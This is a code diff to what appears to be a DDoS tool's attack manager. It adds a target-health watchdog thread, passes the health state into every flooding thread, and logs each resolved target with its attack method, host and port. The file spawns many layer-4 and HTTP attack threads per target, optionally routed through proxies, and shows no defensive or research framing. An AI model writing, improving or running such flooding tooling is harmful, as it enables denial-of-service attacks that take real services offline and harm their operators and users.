@@ -13,6 +13,7 @@ from PyRoxy import Proxy
 from yarl import URL
 
 from ..adapter.methods import L4_METHODS, METHOD_REGISTRY, make_attack_thread
+from .health import TargetHealth, health_watchdog_loop
 from .monitor import monitor_loop
 from .proxy_manager import ProxyManager
 
@@ -27,11 +28,14 @@ class AttackManager:
         self.event = threading.Event()
         self.threads: List[threading.Thread] = []
         self.monitor_thread = None
+        self.health_thread = None
         self.target_stats: Dict[str, List[int]] = {}
         self.stats_lock = threading.Lock()
+        self.target_health = TargetHealth()
         self._proxy_list: Optional[List[Proxy]] = None
         self._proxies_loaded = False
         self.target_keys: List[str] = []
+        self.resolved_targets: List[str] = []
         self.table_height = 0
 
     def _load_proxies_if_needed(self, proxy_enabled: int, check_url: str) -> Optional[List[Proxy]]:
@@ -45,6 +49,7 @@ class AttackManager:
     def _spawn_threads(self):
         self.threads.clear()
         target_keys = []
+        self.resolved_targets = []
 
         settings = self.config.get("settings", {})
         default_threads = settings.get("threads", 100)
@@ -89,6 +94,7 @@ class AttackManager:
                 actual_ip = ip if ip else socket.gethostbyname(ip_part)
                 key = f"{actual_ip}:{port}"
                 target_keys.append(key)
+                self.resolved_targets.append(f"{method} {actual_ip}:{port}")
                 for _ in range(threads):
                     thread = make_attack_thread(
                         method,
@@ -96,6 +102,7 @@ class AttackManager:
                         stats_dict=self.target_stats,
                         stats_lock=self.stats_lock,
                         synevent=self.event,
+                        target_health=self.target_health,
                         l4_target=(actual_ip, port),
                     )
                     self.threads.append(thread)
@@ -104,7 +111,9 @@ class AttackManager:
                 hostname = url.host
                 actual_ip = ip if ip else socket.gethostbyname(hostname)
                 key = url.host
+                port = url.port or (443 if url.scheme.lower() == "https" else 80)
                 target_keys.append(key)
+                self.resolved_targets.append(f"{method} {hostname}:{port}")
                 proxies = self._load_proxies_if_needed(proxy_enabled, str(url))
                 proxy_set = set(proxies) if proxies else None
                 for thread_id in range(threads):
@@ -114,6 +123,7 @@ class AttackManager:
                         stats_dict=self.target_stats,
                         stats_lock=self.stats_lock,
                         synevent=self.event,
+                        target_health=self.target_health,
                         thread_id=thread_id,
                         url=url,
                         host=actual_ip,
@@ -160,6 +170,9 @@ class AttackManager:
         with self.stats_lock:
             self.target_stats.clear()
 
+        for resolved in self.resolved_targets:
+            logger.info("Resolved target %s", resolved)
+
         logger.info(f"Launching {len(self.threads)} threads...")
         for thread in self.threads:
             thread.start()
@@ -180,6 +193,21 @@ class AttackManager:
             daemon=True,
         )
         self.monitor_thread.start()
+
+        if self.health_thread and self.health_thread.is_alive():
+            self.health_thread.join(timeout=0.5)
+        self.health_thread = threading.Thread(
+            target=health_watchdog_loop,
+            args=(
+                self.event,
+                self.target_health,
+                self.target_keys,
+                self.target_stats,
+                self.stats_lock,
+            ),
+            daemon=True,
+        )
+        self.health_thread.start()
 
     def stop(self):
         if not self.event.is_set():
